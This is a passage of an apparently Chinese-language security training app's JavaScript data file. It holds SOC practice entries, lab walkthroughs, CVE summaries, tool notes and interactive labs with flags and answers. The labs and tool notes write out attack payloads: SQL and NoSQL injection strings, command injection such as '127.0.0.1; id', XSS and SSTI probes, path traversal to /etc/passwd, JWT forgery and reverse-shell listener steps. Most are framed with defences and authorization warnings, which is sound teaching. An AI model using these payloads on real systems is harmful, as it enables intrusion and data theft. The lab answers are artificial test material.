          keywords: ["桌面推演","演练","预案验证","红蓝对抗","复盘"],
          levels: {
            "入门": "桌面推演就是大家坐下来「演一遍」：假设发生了某事件，从发现到恢复逐个环节问「谁做什么」。",
            "初级": "形式：设定场景（勒索/数据泄露/供应链事件）→ 按时间推进 → 每个节点确认责任人与动作 → 记录卡点。",
            "中级": "实战：场景要贴真实（结合自身资产与业务），并故意留出难点（关键联系人休假、备份不可用、媒体询问）；卡点即为改进项。",
            "高级": "深入：演练后把改进项落到责任人与期限并复验；成熟组织会做「不通知的实战演练」检验真实响应能力。",
          },
          codeLang: "text",
          code:
`桌面推演记录
场景：核心数据库服务器遭勒索加密
T+0 谁发现？通过什么信号？
T+15m 谁决策隔离？影响哪些业务？
T+1h 备份是否可用？谁验证？
T+4h 对外如何沟通？谁批准口径？
卡点：___ 改进项：___ 责任人：___ 期限：___`,
          tool: "演练剧本、复盘模板",
          refs: "应急演练实践"
        },
        {
          id: "soc-intel-priority", name: "情报驱动的检测优先级", level: "中级",
          summary: "情报不只看「有哪些 IOC」，更要看「哪些技术正被用于我们这类目标」，据此定检测优先级。",
          keywords: ["情报驱动","优先级","行业威胁","检测","对齐"],
          levels: {
            "入门": "情报的价值是帮你决定先防什么：如果同行业最近常被打某个漏洞，那你就该优先补它。",
            "初级": "做法：按行业与资产相关性筛选情报（同业攻击活动、在用组件漏洞），再对应到自己的检测与加固项。",
            "中级": "实战：把情报转成「待验证的检测假设」，用狩猎或紫队演练确认检测是否有效；不能只做「收集→归档」。",
            "高级": "深入：建立情报到检测的链路台账（哪条情报转成了哪条规则、是否验证通过），并评估情报带来的实际收益。",
          },
          codeLang: "text",
          code:
`情报 → 检测的转化记录
情报：同业遭遇 XX 组件漏洞利用
相关：我们在用该组件（版本检查）
动作：1) 补检测规则 2) 升级组件 3) 狩猎历史日志
验证：规则是否真能检出（用样本回归）`,
          tool: "情报平台、检测平台、ATT&CK",
          refs: "情报驱动检测实践"
        },
        {
          id: "soc-cti-sharing", name: "威胁情报共享与交换", level: "中级",
          summary: "共享能放大防御效果，但必须处理脱敏、可信度与格式问题，否则共享即泄露。",
          keywords: ["情报共享","交换","脱敏","可信度","格式"],
          levels: {
            "入门": "同行之间交换「最近被谁打、用什么手法」很有价值，但共享前要先去掉自己的敏感信息。",
            "初级": "共享前处理：脱敏（去掉内部资产名、IP 与人员信息）、标注可信度与来源、统一格式（如 STIX/TAXII 类的结构化表达）。",
            "中级": "实战：明确共享范围与规则（谁能拿到什么级别的信息）、记录情报来源与授权限制，避免二次传播违反约定。",
            "高级": "深入：共享的价值在于「可执行 + 可验证」——收到情报后要转成检测规则或狩猎假设并回归；同时评估共享渠道本身的可信度。",
          },
          codeLang: "text",
          code:
`共享前处理
1) 脱敏：删去内部资产/IP/人名等敏感字段
2) 标注：来源、可信度、适用时间窗
3) 格式：结构化（便于自动导入检测）
4) 约束：共享范围与再传播限制
`,
          tool: "情报平台、STIX/TAXII、脱敏脚本",
          refs: "威胁情报共享实践"
        },
        {
          id: "soc-net-forensics", name: "网络取证与流量回溯", level: "高级",
          summary: "当主机证据不足时，网络侧留存能回答问题「它和谁通信、传了什么、持续多久」。",
          keywords: ["网络取证","流量回溯","会话重建","留存","时间线"],
          levels: {
            "入门": "主机上的痕迹可能被清掉，但网络上的通信记录往往还在——它能告诉你这台机器当时在和谁说话。",
            "初级": "两类数据：元数据（谁和谁、多少流量、什么时候）与全流量（可回溯内容）；前者轻量可长期留存，后者成本高需按需开启。",
            "中级": "实战：回溯流程是「定位时间窗 → 提取相关会话（五元组）→ 重建会话内容与文件 → 与主机日志对齐时间线」。",
            "高级": "深入：证据完整性同样适用（采集记录、哈希、来源可追溯）；加密流量下靠元数据与指纹分析，必要时结合端点侧解密点。",
          },
          codeLang: "bash",
          code:
`# 流量回溯常用手段（授权环境）
zeek -r capture.pcap                 # 生成会话/协议元数据
tshark -r capture.pcap -Y "ip.addr==10.0.0.5" -T fields -e frame.time -e ip.dst -e tcp.dstport
# 关键：时间窗 + 五元组定位，再与主机日志对齐时间线
`,
          tool: "Zeek、tshark、全流量留存平台",
          refs: "网络取证实践"
        },
        {
          id: "soc-hunt-data", name: "狩猎数据工程", level: "中级",
          summary: "狩猎的上限由数据决定：先清楚有哪些数据、字段全不全、留多久，再谈假设与查询。",
          keywords: ["数据工程","数据源","字段质量","留存","查询库"],
          levels: {
            "入门": "想主动找线索，得有数据可查。所以要先把「有哪些日志、都记了什么字段」摸清楚。",
            "初级": "数据清单要素：来源系统、关键字段（账号/源 IP/目标/动作/结果）、保留期、采集完整性；缺口要显式记录。",
            "中级": "实战：字段缺失是狩猎失败的最常见原因（缺源 IP 就无法定位来源）——发现缺口要推动补齐；把常用查询沉淀成查询库。",
            "高级": "深入：在留存成本与调查需求之间取平衡（热数据短期全量、冷数据长期元数据）；把高频狩猎需求反馈给采集策略，形成正向循环。",
          },
          codeLang: "text",
          code:
`狩猎数据清单（示例字段）
认证：账号 / 源 IP / 目标系统 / 结果 / 失败原因
进程：父进程 / 命令行 / 用户 / 文件哈希
网络：五元组 / 会话时长 / 字节数
缺口登记：缺什么 → 影响哪类狩猎 → 推动补齐
`,
          tool: "SIEM、数据目录、查询库",
          refs: "狩猎数据工程实践"
        },
      ]
    }
  ],

  /* ---------------- 实战靶场 ---------------- */
  ranges: [
    { id:"r_sqli", cat:"web", level:"初级", title:"基础 SQL 注入（Union 回显）",
      summary:"在授权 DVWA/本地靶机中，利用 Union 注入提取数据库版本与用户表。",
      setup:"本地部署 DVWA（Security=Low）或 PortSwigger SQLi lab。请勿对未授权站点测试。",
      steps:["用单引号探测报错，确认注入点","用 ORDER BY 判断列数","用 UNION SELECT 定位回显列","读取 version()/user()/database()","枚举 information_schema 取出管理员表"],
      writeup:"核心是把用户输入当数据而非指令。低安全级别下未使用预处理，单引号闭合后插入 union 即可回显。实战中应先尝试参数化查询确认是否修复。",
      defense:"使用预处理语句（占位符），并对数据库账号做最小权限与库名隔离。"},
    { id:"r_xss", cat:"web", level:"初级", title:"存储型 XSS 与 Cookie 窃取（防御视角）",
      summary:"理解存储型 XSS 触发链路，并演示正确的输出编码与 CSP 防护。",
      setup:"本地 DVWA 留言板（Security=Low）。仅用于理解原理，不实际窃取他人凭证。",
      steps:["在留言内容注入 <script> 弹窗验证触发点","观察存储后在他人页面自动执行","改用 textContent/输出编码使脚本失效","加 CSP 头进一步限制内联脚本"],
      writeup:"存储型 XSS 危害最大，因为持久化且影响所有访问者。修复必须在「输出到 HTML 上下文时编码」，而非仅过滤输入。CSP 是纵深防御。",
      defense:"输出编码 + HttpOnly Cookie + CSP；框架默认转义，慎用 dangerouslySetInnerHTML。"},
    { id:"r_cmd", cat:"web", level:"中级", title:"命令注入盲打（带外验证）",
      summary:"当无回显时，用 DNS/HTTP 带外通道确认命令是否执行。",
      setup:"本地存在 os.system 拼接的漏洞页面（自建教学环境）。",
      steps:["构造 ; ping 测试延迟判断执行","用 curl/busybox 向自有监听服务发请求（OOB）","确认命令上下文与权限","改用参数数组重构代码"],
      writeup:"盲命令注入靠副作用（时间、网络）判断。OOB 需自有可控的监听域名/服务，切勿指向他人主机。",
      defense:"避免调用 shell；使用参数数组；对确需 shell 的场景用 shlex.quote 严格转义。"},
    { id:"r_stack", cat:"binary", level:"入门", title:"经典栈溢出（关闭保护练习）",
      summary:"在 -fno-stack-protector -z execstack 编译的练习程序上理解溢出原理。",
      setup:"本地 C 练习程序 + pwntools + gdb/pwndbg。编译时显式关闭保护以教学。",
      steps:["用 Cyclic 确定返回地址偏移","构造 padding + 跳转到 shellcode/后门函数","用 gdb 观察栈布局","开启 canary/NX 后讨论绕过思路"],
      writeup:"栈溢出是理解所有内存破坏的起点。现代默认开启保护，真实利用需 ROP/泄漏，本练习仅演示原理。",
      defense:"开启栈保护(-fstack-protector)、NX、PIE、ASLR；用安全函数替代危险 API。"},
    { id:"r_rop", cat:"binary", level:"高级", title:"ret2libc 绕过 NX/ASLR",
      summary:"泄漏 libc 地址并调用 system('/bin/sh') 构造稳定利用链。",
      setup:"开启 NX+ASLR 的练习二进制 + 已知版本 libc。",
      steps:["利用漏洞泄漏 puts/GOT 真实地址","通过 libc-database 定位版本","计算 system 与 /bin/sh 偏移","拼出 ROP 链获取 shell（注意栈对齐）"],
      writeup:"ret2libc 是 NX 环境下最经典的利用。关键在「先泄漏再计算」，且需匹配目标 libc 版本。",
      defense:"Full RELRO + PIE + ASLR + 编译期 CFI；及时更新 libc。"},
    { id:"r_rsa", cat:"crypto", level:"中级", title:"RSA 低指数/共模攻击",
      summary:"理解 RSA 实现中的常见数学陷阱（仅用已知教学参数）。",
      setup:"已知 n、e、c 的教学题目（使用小参数，禁止用于真实系统）。",
      steps:["识别 e 过小或同 n 多 m 广播场景","用中国剩余定理解广播攻击","或用费马分解处理 p,q 相近","确认 OAEP 填充可彻底规避此类问题"],
      writeup:"RSA 的安全依赖正确实现。低指数、共模、弱随机都会摧毁理论安全性。务必使用库的标准 OAEP 流程。",
      defense:"e=65537、足够随机素数、OAEP 填充、2048 位以上密钥。"},
    { id:"r_hash", cat:"crypto", level:"初级", title:"哈希长度扩展攻击（理解）",
      summary:"演示在 hash(secret||msg) 结构下的长度扩展，强调 HMAC 的必要性。",
      setup:"使用 SHA-256 且 hash(secret+data) 的服务（教学环境）。",
      steps:["理解 Merkle–Damgård 可追加状态","在不知 secret 时构造合法扩展消息","验证服务端接受伪造 MAC","改用 HMAC 后攻击失效"],
      writeup:"长度扩展说明「自创 MAC 结构」不可靠。消息认证必须用 HMAC/带密钥的 AEAD。",
      defense:"使用 HMAC-SHA256 或 AES-GCM，绝不自行拼接 secret 做 MAC。"},
    { id:"r_recon", cat:"pentest", level:"入门", title:"授权资产侦察演练",
      summary:"在书面授权范围内完成子域名发现、端口扫描与资产梳理。",
      setup:"对【你拥有或已获书面授权】的域名/范围进行，记录全部动作与时间。",
      steps:["被动收集：证书透明度、WHOIS、OSINT","主动：Nmap 端口/版本、目录爆破","整理资产与暴露面清单","标注需进一步验证的高危端口"],
      writeup:"侦察是一切的前提，也最易被滥用。纪律：严格限定授权范围、留存授权证明、不扫描范围外资产。",
      defense:"收敛暴露面、关闭无用端口、启用 WAF/CDN、定期资产测绘。"},
    { id:"r_priv", cat:"pentest", level:"中级", title:"Linux 提权路径（授权主机）",
      summary:"在已授权的测试主机上用 PEAS 枚举并复现一条提权路径。",
      setup:"你拥有合法权限的测试虚拟机（如本地 VulnHub 镜像）。",
      steps:["运行 LinPEAS 收集线索","检查 sudo -l / SUID / cron 配置弱点","复现提权并截图留证","给出最小权限与补丁修复建议"],
      writeup:"提权多数来自配置错误而非 0day。修复以最小权限与及时补丁为主。",
      defense:"最小权限账号、审计 sudoers、及时更新内核、加固 cron。"},
    { id:"r_xxe", cat:"web", level:"中级", title:"XXE 文件读取（授权靶机）",
      summary:"在授权靶机/PortSwigger XXE lab 中，利用外部实体读取服务器本地文件。",
      setup:"本地部署含 XML 解析的老接口（如旧 SOAP 练习服务）或 PortSwigger XXE lab。",
      steps:["提交含 <!ENTITY> 的恶意 XML 探测报错","读取 /etc/passwd 验证外部实体开启","尝试 blind XXE 参数实体带外","修复：禁用 DOCTYPE 与外部实体后复测"],
      writeup:"根因是 XML 解析器开启了外部实体解析。现代框架默认关闭，但遗留 XML 处理仍是重灾区。",
      defense:"禁用 DTD/外部实体（LIBXML_NONET）、用 JSON 替代 XML、对确需 XML 用安全解析器。"},
    { id:"r_jwt", cat:"web", level:"中级", title:"JWT 算法混淆/弱密钥（授权靶机）",
      summary:"在授权靶机中，利用 alg=none 或 RS→HS 混淆或弱密钥伪造管理员令牌。",
      setup:"本地存在 JWT 校验且算法可由客户端控制的练习接口。",
      steps:["解码令牌确认结构与算法","尝试 alg=none 或把 RS256 当 HS256 用公钥签","弱密钥用 hashcat 跑 rockyou 爆破","修复：固定算法白名单 + 强密钥后复测"],
      writeup:"JWT 安全依赖「签名验证不可绕过 + 密钥不可预测」。算法由客户端控制是典型实现错误。",
      defense:"服务端固定 algorithms 白名单、用强随机密钥、校验 aud/exp/nonce。"},
    { id:"r_traversal", cat:"web", level:"初级", title:"目录遍历读敏感文件（授权靶机）",
      summary:"在授权靶机中，利用 ../ 跳出基目录读取系统文件。",
      setup:"本地存在把文件名拼进路径的下载/读取接口（自建教学环境）。",
      steps:["用 ../../../../etc/passwd 逐级跳出","确认可读取系统文件","尝试编码绕过（..%2f、双写）","修复：白名单文件名 + 规范化前缀校验后复测"],
      writeup:"根因是路径拼接未规范化也未限基目录。防御必须在「输出真实路径」前校验落在允许目录内。",
      defense:"白名单文件名、用路径库函数规范化后校验前缀、禁止用户控制目录部分。"},
    { id:"r_nosql", cat:"web", level:"初级", title:"NoSQL 注入登录绕过（授权靶机）",
      summary:"在授权靶机中，向 MongoDB 查询注入 $ne / || 让登录条件恒真。",
      setup:"本地存在用对象做查询的登录接口（如 Express + Mongoose 误用）。",
      steps:["用户名填 { \"$ne\": \"\" } 观察绕过","尝试 ' || '1'=='1","确认以 admin 登录","修复：严格类型 + 拒绝 $ 运算符后复测"],
      writeup:"根因是用户可控输入被当作查询对象/运算符。与 SQL 注入同属「数据与指令未分离」。",
      defense:"用严格类型参数、拒绝以 $ 开头的字段、对输入做结构白名单校验。"},
    { id:"r_oauth", cat:"pentest", level:"中级", title:"OAuth redirect_uri 劫持（授权演练）",
      summary:"在授权演练环境中，利用 redirect_uri 校验不严把授权码导流到攻击者站点。",
      setup:"你拥有合法权限的演练应用或本地搭建的 OAuth 授权码流程。",
      steps:["找到一个开放重定向或子路径宽松的 redirect_uri","构造恶意 redirect_uri 骗取授权码","用授权码换 token（演示危害，不实际窃取）","修复：精确白名单 redirect_uri + PKCE 后复测"],
      writeup:"OAuth 安全取决于正确实现：redirect_uri 精确匹配、PKCE、state 防 CSRF、token 单次使用。",
      defense:"精确白名单 redirect_uri、强制 PKCE、校验 state/nonce、短期且绑定的 token。"}
  ],

  /* ---------------- 安全资讯（已公开、已修复历史漏洞，防御视角） ---------------- */
  news: [
    { id:"n_log4j", title:"Log4Shell（CVE-2021-44228）", cve:"CVE-2021-44228", date:"2021-12", cat:"web",
      summary:"Apache Log4j2 的 JNDI 查找允许远程加载恶意类，影响范围极广。",
      defense:"升级到 2.17.0+；禁用 JNDI 查找；通过 WAF 拦截 ${jndi}；进行资产盘点与版本排查。这是「依赖供应链」风险的标志性事件。"},
    { id:"n_spring", title:"Spring4Shell（CVE-2022-22965）", cve:"CVE-2022-22965", date:"2022-03", cat:"web",
      summary:"Spring Framework 在特定部署下可通过数据绑定实现 RCE。",
      defense:"升级 Spring 至安全版本；避免将应用部署为 WAR 于 Tomcat 默认配置；对数据绑定做类型白名单。"},
    { id:"n_heartbleed", title:"Heartbleed（CVE-2014-0160）", cve:"CVE-2014-0160", date:"2014-04", cat:"web",
      summary:"OpenSSL 心跳扩展越界读，可泄漏内存中的私钥与凭证。",
      defense:"升级 OpenSSL、轮换受影响证书与密钥；启用内存安全边界检查。启示：边界检查缺失会直接威胁信任根。"},
    { id:"n_eternalblue", title:"EternalBlue（MS17-010）", cve:"MS17-010", date:"2017-05", cat:"pentest",
      summary:"Windows SMBv1 远程代码执行漏洞，曾被勒索软件大规模利用。",
      defense:"禁用 SMBv1、及时打补丁、网络分段与 EDR 监测；不要暴露 445 端口到公网。"},
    { id:"n_bluekeep", title:"BlueKeep（CVE-2019-0708）", cve:"CVE-2019-0708", date:"2019-05", cat:"pentest",
      summary:"远程桌面服务预认证 RCE，无需用户交互即可被利用。",
      defense:"为 RDP 启用 NLA、及时补丁、限制 RDP 暴露、使用 VPN/堡垒机接入。"},
    { id:"n_spectre", title:"Spectre / Meltdown 系列", cve:"CVE-2017-5753 等", date:"2018-01", cat:"binary",
      summary:"CPU 推测执行侧信道可跨进程泄露内存，属硬件层面根本性问题。",
      defense:"更新内核/微码、启用站点隔离、关注浏览器缓解；理解「信任边界延伸到硬件」。"},
    { id:"n_proxlogon", title:"ProxyLogon（CVE-2021-26855）", cve:"CVE-2021-26855", date:"2021-03", cat:"web",
      summary:"Exchange Server 预认证 SSRF + 任意文件写，可接管邮件服务器并落地 webshell。",
      defense:"升级 Exchange 至官方补丁、限制 ECP/OWA 暴露、启用 AMSI、定期排查异常虚拟目录与 webshell。"},
    { id:"n_zologon", title:"Zerologon（CVE-2020-1472）", cve:"CVE-2020-1472", date:"2020-08", cat:"pentest",
      summary:"Netlogon 远程协议认证缺陷，可将域控机器账户密码置空，进而夺取域控。",
      defense:"及时打补丁、强制 Netlogon 安全通道、监控域控机器账户异常重置（事件 4742/5805）。"},
    { id:"n_printnightmare", title:"PrintNightmare（CVE-2021-34527）", cve:"CVE-2021-34527", date:"2021-07", cat:"pentest",
      summary:"Windows 打印后台处理程序远程代码执行，低权限用户可提权至 SYSTEM。",
      defense:"禁用 Print Spooler 服务（非必需时）、限制驱动安装权限、及时补丁、网络分段。"},
    { id:"n_fortinet", title:"Fortinet SSL VPN 路径遍历（CVE-2018-13379）", cve:"CVE-2018-13379", date:"2019-06", cat:"pentest",
      summary:"FortiOS SSL VPN 路径遍历可读取会话文件，泄露用户名与明文口令等敏感信息。",
      defense:"升级 FortiOS、轮换所有 VPN 凭据、收敛 VPN 暴露面并启用 MFA。"},
    { id:"n_gitlab", title:"GitLab 反序列化 RCE（CVE-2021-22205）", cve:"CVE-2021-22205", date:"2021-04", cat:"web",
      summary:"GitLab 图片处理组件反序列化漏洞，未授权即可执行任意代码。",
      defense:"升级 GitLab 至安全版本、最小化暴露、启用 WAF 与入侵检测、定期漏洞扫描。"}
  ],

  /* ---------------- 安全工具（使用说明 + 合规提示） ---------------- */
  tools: [
    { id:"t_burp", name:"Burp Suite", cat:"web",
      desc:"Web 代理与漏洞测试平台，用于拦截/修改请求、扫描与重放。",
      usage:"配置浏览器代理 → 拦截请求 → Repeater 手工验证 → Intruder 做授权暴力/参数测试 → Scanner（Pro）辅助。",
      example:"Proxy 拦截登录包，修改 username 为 ' OR '1'='1 观察响应差异，确认注入点。",
      note:"仅用于你拥有授权的应用。不要开启「拦截并修改」他人流量。"},
    { id:"t_nmap", name:"Nmap", cat:"pentest",
      desc:"业界标准端口扫描与服务/版本/脚本探测工具。",
      usage:"nmap -sV -sC 做版本与默认脚本探测；-p- 全端口；--script 调 vuln 类脚本。",
      example:"nmap -sV -oA scan 10.10.10.10",
      note:"扫描前必须书面授权，避免在共享/生产网络造成拥塞或被误判为攻击。"},
    { id:"t_sqlmap", name:"sqlmap", cat:"web",
      desc:"自动化 SQL 注入检测与利用工具。",
      usage:"sqlmap -u URL --dbs 枚举库；--risk/--level 控制深度；--batch 非交互。",
      example:"sqlmap -u 'https://lab.example.com/item?id=1' --batch --dbs",
      note:"仅对授权靶场/自有目标使用。其流量特征明显，易被 WAF/IDS 记录。"},
    { id:"t_pwntools", name:"pwntools", cat:"binary",
      desc:"Python 编写的 CTF/pwn 利用框架，简化 exp 编写与交互。",
      usage:"from pwn import * 连接远程/本地、构造 payload、交互。",
      example:"io = remote('host', port); io.sendline(payload); io.interactive()",
      note:"用于本地靶机与 CTF 练习。禁止对未授权服务发起连接与利用。"},
    { id:"t_gdb", name:"GDB + pwndbg", cat:"binary",
      desc:"Linux 下调试二进制、分析崩溃与利用的标配。",
      usage:"gdb ./bin 加载，pwndbg 提供堆/栈可视化、cyclic、checksec。",
      example:"checksec ./pwn 查看保护；cyclic 定位溢出偏移。",
      note:"纯本地分析工具，合规风险低，但分析结果不要用于非授权利用。"},
    { id:"t_hashcat", name:"Hashcat / John", cat:"crypto",
      desc:"高性能口令恢复（哈希破解）工具，用于审计弱口令强度。",
      usage:"hashcat -m 0 -a 0 hashes.txt rockyou.txt 跑字典；弱口令暴露即修复。",
      example:"hashcat -m 1000 nt_hashes.txt -w 3 wordlist.txt",
      note:"仅用于你负责的系统/授权的口令审计。破解他人口令属违法。"},
    { id:"t_nuclei", name:"Nuclei", cat:"pentest",
      desc:"基于模板的快速漏洞扫描器，社区维护大量 CVE/配置模板。",
      usage:"nuclei -u target -t cves/ 跑已知漏洞模板；可自写模板。",
      example:"nuclei -l targets.txt -t exposures/ -o out.txt",
      note:"扫描动作须授权；扫描结果含敏感信息，妥善留存与销毁。"},
    { id:"t_wireshark", name:"Wireshark", cat:"pentest",
      desc:"网络协议分析器，用于排查流量异常与学习协议结构。",
      usage:"抓包 → 按协议过滤（http、tls、dns）→ 分析握手与明文泄露。",
      example:"过滤 tls.handshake 观察证书与握手过程。",
      note:"只抓你有权监控的接口/流量。抓他人通信违反隐私与法律。"},
    { id:"t_ghidra", name:"Ghidra", cat:"binary",
      desc:"NSA 开源的逆向工程/反汇编框架，带反编译与图形化分析。",
      usage:"导入二进制 → 自动分析 → 反编译为伪 C → 定位关键函数与字符串。",
      example:"在反编译器窗口搜索敏感字符串，交叉引用定位校验逻辑。",
      note:"用于本地二进制审计与 CTF 逆向。分析结果不要用于非授权利用。"},
    { id:"t_cyberchef", name:"CyberChef", cat:"crypto",
      desc:"「网络瑞士军刀」：浏览器内完成编码/解码、加解密、哈希、正则等数据操作。",
      usage:"左侧选操作（From Base64、AES Decrypt、MD5 等）拖入配方，实时看结果。",
      example:"From Base64 → 即可看到 JWT payload 明文；或 MD5(input) 验证弱口令。",
      note:"纯本地/在线数据处理工具，合规风险低；勿把敏感明文粘贴到不可信的在线实例。"},
    { id:"t_volatility", name:"Volatility", cat:"binary",
      desc:"内存取证分析框架，从内存镜像中提取进程、网络连接、恶意代码痕迹。",
      usage:"volatility -f mem.raw imageinfo 识别Profile → pslist/malfind/netscan 分析。",
      example:"volatility -f dump.raw --profile=Win10x64 pslist 列出进程找异常。",
      note:"用于授权事件响应与取证练习。内存镜像须来自你有权分析的机器。"},
    { id:"t_metasploit", name:"Metasploit Framework", cat:"pentest",
      desc:"漏洞利用与后渗透框架，模块化 payload 与 exploit 管理。",
      usage:"msfconsole → search <cve> → use exploit → set RHOST → run；或生成载荷。",
      example:"msf6 > use exploit/multi/handler 监听反弹 shell（仅授权环境）。",
      note:"只对你拥有书面授权的目标使用。其流量与载荷特征明显，极易触发告警与法律问题。"}
  ],

  /* ---------------- 在线演练（程序内可交互靶场，纯前端模拟） ---------------- */
  labs: [
    {
      id:"lab_sqli", type:"sqli", cat:"web", level:"初级", title:"SQL 注入：登录绕过",
      brief:"这是一个模拟的登录接口，后端用字符串拼接构造 SQL：\nSELECT * FROM users WHERE username='<输入>' AND password='<输入>'\n试着构造 payload 让 WHERE 条件恒为真，从而以 admin 身份登录。",
      task:"在下方填写用户名与密码，点「提交查询」观察构造出的 SQL 与登录结果。",
      hints:["经典绕过：用户名填 admin' -- 让密码校验被注释掉","或用户名填 ' OR '1'='1' -- 让条件恒真","注意单引号要成对，否则语句语法错误"]
    },
    {
      id:"lab_cmdi", type:"cmdi", cat:"web", level:"初级", title:"命令注入：拼接 ping",
      brief:"某网站把你输入的主机名直接拼进 shell 命令：\nping -c1 <输入>\n试着用分隔符执行额外命令（如 id / whoami）。",
      task:"输入主机名（如 127.0.0.1），并尝试用 ; 或 && 追加命令。",
      hints:["用 127.0.0.1; id 或 127.0.0.1 && whoami","分隔符让 shell 把后半段当作新命令执行","防御：用参数数组而非 shell 拼接，或对输入严格转义"]
    },
    {
      id:"lab_xss", type:"xss", cat:"web", level:"初级", title:"反射型 XSS：搜索回显",
      brief:"搜索框会把你的输入原样回显到页面。如果输入脚本会怎样？\n下方在隔离沙箱里预览效果（sandbox 隔离，不会影响本应用）。",
      task:"输入一段能触发脚本的 payload，例如 <script>alert(1)</script> 或 <svg onload=alert(1)>。",
      hints:["<script>alert(1)</script> 是最直接的","事件处理器写法：<img src=x onerror=alert(1)>","防御：输出编码 + 内容安全策略 CSP"]
    },
    {
      id:"lab_b64", type:"decode", cat:"crypto", level:"入门", title:"密码学：Base64 解码",
      brief:"下面是一段 Base64 编码的字符串，请解码出原始内容（即 flag）。",
      task:"把解码结果填到输入框并提交。",
      ciphertext:"U2VjVHV0b3J7YmFzZTY0X2RlY29kZX0=",
      answer:"SecTutor{base64_decode}",
      hints:["这是标准 Base64","可用浏览器控制台 atob() 或任意解码工具（仅本地练习）","解码后是 SecTutor{...} 形式"]
    },
    {
      id:"lab_caesar", type:"decode", cat:"crypto", level:"入门", title:"密码学：凯撒密码",
      brief:"一段凯撒密码（每个字母向后移 3 位）的密文，请还原明文。",
      task:"输入明文（含空格与标点）。",
      ciphertext:"Khoor, Vhfuhw sduwb!",
      answer:"Hello, Secret party!",
      hints:["每个字母向后移了 3 位：A->D, B->E ...","反向把每个字母往前移 3 位即可","解码后是一句问候语"]
    },
    {
      id:"lab_quiz", type:"quiz", cat:"binary", level:"入门", title:"找漏洞：栈溢出",
      brief:"读下面这段 C 代码，找出会导致缓冲区溢出的一行。",
      code:"void vuln(char *s){\n  char buf[16];\n  strcpy(buf, s);   // 危险\n  printf(buf);\n}",
      question:"哪一行会导致缓冲区溢出？",
      options:["char buf[16];  // 声明 16 字节栈缓冲区","strcpy(buf, s);  // 不检查长度地拷贝","printf(buf);  // 直接打印"],
      answer:1,
      hints:["strcpy 不检查目标缓冲区大小","buf 只有 16 字节，而 s 可能远大于此","正确写法：strncpy + 边界检查，或改用安全函数"]
    },
    {
      id:"lab_traversal", type:"traversal", cat:"web", level:"初级", title:"路径遍历：读取敏感文件",
      brief:"某下载接口把文件名直接拼进路径：\nreadFile('/var/www/files/' + filename)\n试着用 ../ 跳出目录，读到系统敏感文件（如 /etc/passwd）。",
      task:"输入要读取的文件名，点「读取」观察实际拼接出的路径。",
      hints:["用 ../../../../etc/passwd 逐级跳出基目录","Windows 下 ..\\ 亦可","防御：白名单文件名、限制基目录、规范化后校验前缀"]
    },
    {
      id:"lab_nosql", type:"nosql", cat:"web", level:"初级", title:"NoSQL 注入：登录绕过",
      brief:"一个 MongoDB 登录接口用对象而非字符串做查询：\ndb.users.find({ username: <输入>, password: <输入> })\n试试让 username 条件恒真，绕过密码校验以 admin 登录。",
      task:"填写用户名（可填 JSON/表达式），点「登录」观察构造出的查询与结果。",
      hints:["用 { \"$ne\": \"\" } 让条件「不等于空」恒匹配","或用户名填 ' || '1'=='1 这类恒真","防御：用严格类型，拒绝用户传入对象或 $ 运算符"]
    },
    {
      id:"lab_jwt", type:"decode", cat:"web", level:"中级", title:"JWT 解码：读 payload",
      brief:"下面是一段 JWT（三段用点分隔）。请解码出它的 payload（第二段，Base64URL）明文，这就是 flag。",
      task:"把解码出的 payload 明文填到输入框提交（如 {\"role\":\"admin\"}）。",
      ciphertext:"eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.abcdefghijklmnopqrstuvwxyz",
      answer:"{\"role\":\"admin\"}",
      hints:["JWT 第二段是 Base64URL 编码的 JSON","解码后是 {\"role\":\"admin\"}","防御：固定算法白名单 + 强密钥，勿让 alg 由客户端控制"]
    },
    {
      id:"lab_weakpass", type:"decode", cat:"crypto", level:"入门", title:"密码学：弱口令 MD5 还原",
      brief:"下面是一个 MD5 哈希（32 位十六进制）。它来自一个常见弱口令。请还原出原口令（小写字母数字）。",
      task:"把原口令明文填到输入框提交。",
      ciphertext:"e10adc3949ba59abbe56e057f20f883e",
      answer:"123456",
      hints:["这是最常见的弱口令之一（6 位数字）","MD5 不可用于口令存储；用哈希猫可直接爆破","防御：bcrypt/argon2 + 加盐"]
    },
    {
      id:"lab_csp", type:"quiz", cat:"web", level:"初级", title:"找漏洞：CSP 配置",
      brief:"读下面这段 HTTP 响应头，判断它能否有效阻止内联脚本执行。\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'",
      code:"Content-Security-Policy: default-src 'self';\nscript-src 'self' 'unsafe-inline'",
      question:"这段 CSP 能阻止 XSS 执行内联脚本吗？",
      options:["能，'self' 已经足够安全","不能，'unsafe-inline' 明确允许内联脚本执行","取决于浏览器版本"],
      answer:1,
      hints:["'unsafe-inline' 会放行 <script> 与 on* 事件处理器","正确做法：去掉 unsafe-inline 并配合随机数/哈希 nonce","CSP 是纵深防御，不能替代输出编码"]
    },
    {
      id:"lab_ssti", type:"ssti", cat:"web", level:"中级", topic:"ssti", title:"服务端模板注入（SSTI）",
      brief:"某站把用户输入直接拼进模板字符串再渲染：\nrender_template_string(\"Hello \" + user_input)\n试着构造模板表达式，看服务端是否把它当作代码执行——这就是 SSTI 漏洞。",
      task:"在下方输入一段模板表达式，点「渲染」观察服务端把你的输入当作模板执行的结果。",
      example:"{{7*7}}",
      hints:["最经典的探测：{{7*7}} 若返回 49 说明表达式被执行","Jinja2 下可试 {{config}} / {{7*'7'}} 读取对象或自乘","防御：永远不要把用户输入拼进模板源码，用固定模板 + 变量传参"]
    },
    {
      id:"lab_idor", type:"idor", cat:"web", level:"初级", topic:"idor", title:"越权访问（IDOR）",
      brief:"某接口根据 URL 里的 id 返回用户资料：\nGET /api/user/<id>/profile\n你登录后的身份是 id=1001。试着篡改 id 去读取别人的资料，理解「客户端可改参数」带来的越权风险。",
      task:"在下方输入你想访问的 id（默认你自己的 1001），点「请求资料」观察服务端是否返回了别人的数据。",
      example:"1002",
      hints:["把 id 改成 1002、1003 等别人的编号即可越权读取","或改成 admin / 1000 这类高权限账户","防御：服务端必须按当前登录用户校验资源归属，绝不能信任客户端传入的 id"]
    },
    {
      id:"lab_lfi", type:"lfi", cat:"web", level:"初级", topic:"lfi", title:"文件包含与本地文件读取（LFI）",
      brief:"某页面用参数决定包含哪个文件：\ninclude($_GET['page'])\n试着用 ../ 跳出 Web 目录，或利用 PHP 包装器读取源码，暴露本地文件包含漏洞。",
      task:"在下方输入 page 参数值，点「包含文件」观察实际被包含的路径或内容。",
      example:"../../../../etc/passwd",
